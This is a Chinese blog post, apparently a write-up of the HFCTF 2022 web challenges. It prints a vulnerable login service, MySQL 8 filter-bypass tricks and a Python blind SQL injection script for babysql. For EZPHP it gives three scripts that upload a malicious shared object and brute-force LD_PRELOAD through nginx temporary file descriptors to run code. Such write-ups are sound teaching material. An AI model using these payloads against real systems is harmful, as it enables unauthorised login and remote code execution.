@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="babysql提示 121.It is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in &#x2F;hint.md.2.regexp  拿到hint.md 123456789101112131415161718192021222">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虎符CTF2022WEB">
+<meta property="og:url" content="https://tefuir72.github.io/2022/03/22/2022032222/index.html">
+<meta property="og:site_name" content="TeFuir&#39;Blog">
+<meta property="og:description" content="babysql提示 121.It is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in &#x2F;hint.md.2.regexp  拿到hint.md 123456789101112131415161718192021222">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-22T14:29:58.000Z">
+<meta property="article:modified_time" content="2022-03-31T04:56:36.951Z">
+<meta property="article:author" content="Te Fuir">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>虎符CTF2022WEB</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2022/03/26/2022032619/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2022/03/12/2022031221/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/22/2022032222/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/22/2022032222/&text=虎符CTF2022WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/22/2022032222/&is_video=false&description=虎符CTF2022WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虎符CTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/22/2022032222/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/22/2022032222/&name=虎符CTF2022WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/22/2022032222/&t=虎符CTF2022WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babysql"><span class="toc-number">1.</span> <span class="toc-text">babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZPHP"><span class="toc-number">2.</span> <span class="toc-text">EZPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezchain"><span class="toc-number">3.</span> <span class="toc-text">ezchain</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        虎符CTF2022WEB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Te Fuir</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-22T14:29:58.000Z" itemprop="datePublished">2022-03-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.It is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in /hint.md.</span><br><span class="line">2.regexp</span><br></pre></td></tr></table></figure>
+
+<p>拿到hint.md</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># hint.md</span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ConnectionProvider &#125; <span class="keyword">from</span> <span class="string">&#x27;../database/connection.provider&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="attr">id</span>: number;</span><br><span class="line">  username: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">str: string</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> r = str</span><br><span class="line">    .replace(<span class="regexp">/[\s,()#;*\-]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .replace(<span class="regexp">/^.*(?=union|binary).*$/gi</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    .toString();</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Injectable()</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthService</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">private connectionProvider: ConnectionProvider</span>)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> validateUser(username: string, <span class="attr">password</span>: string): <span class="built_in">Promise</span>&lt;User&gt; | <span class="literal">null</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`SELECT * FROM auth WHERE username=&#x27;<span class="subst">$&#123;safe(username)&#125;</span>&#x27; LIMIT 1`</span>;</span><br><span class="line">    <span class="keyword">const</span> [rows] = <span class="keyword">await</span> <span class="built_in">this</span>.connectionProvider.use(<span class="function">(<span class="params">c</span>) =&gt;</span> c.query(sql));</span><br><span class="line">    <span class="keyword">const</span> user = rows[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (user &amp;&amp; user.password === password) &#123;</span><br><span class="line">      <span class="comment">// eslint-disable-next-line @typescript-eslint/no-unused-vars</span></span><br><span class="line">      <span class="keyword">const</span> &#123; password, ...result &#125; = user;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-23">mysql注入trick</a></p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-comparison-functions.html">mysql8文档</a></p>
+<p>测试可知</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 可实现条件判断,0号位为true且1号位为true时执行2号位表达式,从而绕过if语句中的括号</span><br><span class="line">case &#123;0&#125; when &#123;1&#125; then &#123;2&#125; else &#123;3&#125; </span><br><span class="line"></span><br><span class="line"># 引号及反引号包含的字符可与关键字直接拼接从而绕过空格,另外*符号可以直接连接</span><br><span class="line">select*from`users`;</span><br><span class="line">select&#x27;user&#x27;from`users`;</span><br><span class="line"></span><br><span class="line"># regexp和lilke的正则表达式中 ^匹配开头 $匹配结尾,匹配本身时需要注意添加转义符</span><br><span class="line"># 添加binary关键字可以区分大小写,另外mysql8可使用collate&#x27;utf8mb4_bin&#x27;来区分大小写</span><br><span class="line"> </span><br><span class="line"># ~0+~0+&#x27;1&#x27; 可以用作报错型的布尔盲注,相当于exp(100000000)</span><br><span class="line">mysql&gt; select if(1,~0+~0+&#x27;1&#x27;,1);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(~(0) + ~(0))&#x27;</span><br><span class="line">mysql&gt; select if(0,~0+~0+&#x27;1&#x27;,1);</span><br><span class="line">+-------------------+</span><br><span class="line">| if(0,~0+~0+&#x27;1&#x27;,1) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 1 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># exp.py by R</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://47.107.231.226:31042/login&quot;</span><br><span class="line">proxy = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line"></span><br><span class="line"># string = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890^!$&quot;</span><br><span class="line">string = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span><br><span class="line"></span><br><span class="line">res = &quot;&quot;</span><br><span class="line">length = 32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while(length&gt;-1):</span><br><span class="line">    for i in string:</span><br><span class="line">        if i == &#x27;^&#x27; or i == &#x27;!&#x27; or i == &#x27;$&#x27;:</span><br><span class="line">            i = &#x27;\\\\&#x27; + i</span><br><span class="line">        # payload = &quot;1&#x27;||case&#x27;&#x27;when`password`regexp&#x27;^&#123;0&#125;&#123;1&#125;&#x27;collate&#x27;utf8mb4_bin&#x27;then&#x27;&#x27;else~0+~0+&#x27;1&#x27;end=&#x27;0&quot;.format(res, i)</span><br><span class="line">        payload = &quot;1&#x27;||case&#x27;&#x27;when`username`regexp&#x27;^&#123;0&#125;&#123;1&#125;&#x27;collate&#x27;utf8mb4_bin&#x27;then&#x27;&#x27;else~0+~0+&#x27;1&#x27;end=&#x27;0&quot;.format(res, i)</span><br><span class="line">        json = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;123&quot;&#125;</span><br><span class="line">        r = requests.post(url=url, data=json, proxies=proxy)</span><br><span class="line">        if r.status_code != 401:</span><br><span class="line">            res += i</span><br><span class="line">            break</span><br><span class="line">    length -= 1</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
+
+<h2 id="EZPHP"><a href="#EZPHP" class="headerlink" title="EZPHP"></a>EZPHP</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env">我是如何利用环境变量注入执行任意命令 | 离别歌</a></p>
+<p>另外</p>
+<p><a target="_blank" rel="noopener" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">php文件包含几种方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1384/">nginx临时文件</a></p>
+<blockquote>
+<ul>
+<li>当 Nginx 接收来自 FastCGI 的响应时，若大小超过限定值 (大概 32Kb) 不适合以内存的形式来存储的时候，一部分就会以临时文件的方式保存到磁盘上。在 <code>/var/lib/nginx/fastcgi</code> 下产生临时文件。</li>
+<li>但是Nginx 创建文件就立即删除了，不过Nginx删除的<code>/var/lib/nginx/fastcgi</code>下的临时文件，还可以在<code>/proc/pid/fd/</code>下找到 （如果打开一个进程打开了某个文件，某个文件就会出现在 <code>/proc/pid/fd/</code> 目录下，而如果该文件没被关闭的情况下就被删除，仍能在对应的<code>/proc/pid/fd</code>下找到并读取文件内容）</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span>  threading, requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://xxx/&quot;</span></span><br><span class="line">nginx_workers = [<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>]</span><br><span class="line">done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploader</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] starting uploader&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exp.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        requests.get(url, data=data + (<span class="number">16</span> * <span class="number">1024</span> * <span class="string">&#x27;A&#x27;</span>).encode())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    t = threading.Thread(target=uploader)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruter</span>(<span class="params">pid</span>):</span></span><br><span class="line">    <span class="keyword">global</span> done</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] brute loop restarted: <span class="subst">&#123;pid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">32</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url, params=&#123;</span><br><span class="line">                    <span class="string">&#x27;env&#x27;</span>: <span class="string">f&quot;LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span>&quot;</span></span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> nginx_workers:</span><br><span class="line">    a = threading.Thread(target=bruter, args=(pid, ))</span><br><span class="line">    a.start()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># exp2.py</span></span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">addr=<span class="string">&quot;http://120.79.121.132:xxxx&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tr1</span>():</span></span><br><span class="line">   <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      files = <span class="built_in">open</span>(<span class="string">&quot;1.so&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">      url = addr+<span class="string">&quot;/index.php&quot;</span></span><br><span class="line">      requests.post(url, data=files)</span><br><span class="line">      time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tr2</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">            response = requests.get(addr+<span class="string">&quot;/index.php?env=LD_PRELOAD=/proc/12/fd/../../12/fd/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&quot; Response body: %s&quot;</span> % response.content)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   _thread.start_new_thread( tr1,())</span><br><span class="line">   _thread.start_new_thread( tr2,())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;Error: 无法启动线程&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp3.py</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">port = <span class="number">8020</span></span><br><span class="line">host = <span class="string">&#x27;ip&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_so</span>():</span></span><br><span class="line">    data = <span class="built_in">open</span>(<span class="string">&quot;evil.so&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    packet = <span class="string">f&quot;&quot;&quot;POST /index.php HTTP/1.1\r\nHOST:<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r\nContent-Length:<span class="subst">&#123;<span class="built_in">len</span>(data)+<span class="number">11</span>&#125;</span>\r\n\r\n&quot;&quot;&quot;</span></span><br><span class="line">    packet = packet.encode()</span><br><span class="line">    </span><br><span class="line">    packet += data</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, ip))</span><br><span class="line">    s.sendall(packet)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    do_so()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezchain"><a href="#ezchain" class="headerlink" title="ezchain"></a>ezchain</h2><p><a target="_blank" rel="noopener" href="http://datacon.qianxin.com/blog/archives/414">http://datacon.qianxin.com/blog/archives/414</a></p>
+<p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2MjYxMjAzMg==&mid=2247483903&idx=1&sn=26b6af39bc1bf9a0055c0be38a666472&chksm=ce047ed0f973f7c6b7a2ee4a300d10d22cf2a6e38fcbe5190011c8f08b14da9a30db2bf11061&mpshare=1&scene=23&srcid=0321x9PydhpbLJpuag0EBm4W&sharer_sharetime=1647861577180&sharer_shareid=3679f20229d72930158c21ee7f573b1e#rd">唯独你没懂</a></p>
+<p><a target="_blank" rel="noopener" href="http://datacon.qianxin.com/blog/archives/414">hfwp</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babysql"><span class="toc-number">1.</span> <span class="toc-text">babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZPHP"><span class="toc-number">2.</span> <span class="toc-text">EZPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezchain"><span class="toc-number">3.</span> <span class="toc-text">ezchain</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2022/03/22/2022032222/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2022/03/22/2022032222/&text=虎符CTF2022WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2022/03/22/2022032222/&is_video=false&description=虎符CTF2022WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虎符CTF2022WEB&body=Check out this article: https://tefuir72.github.io/2022/03/22/2022032222/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2022/03/22/2022032222/&title=虎符CTF2022WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2022/03/22/2022032222/&name=虎符CTF2022WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2022/03/22/2022032222/&t=虎符CTF2022WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
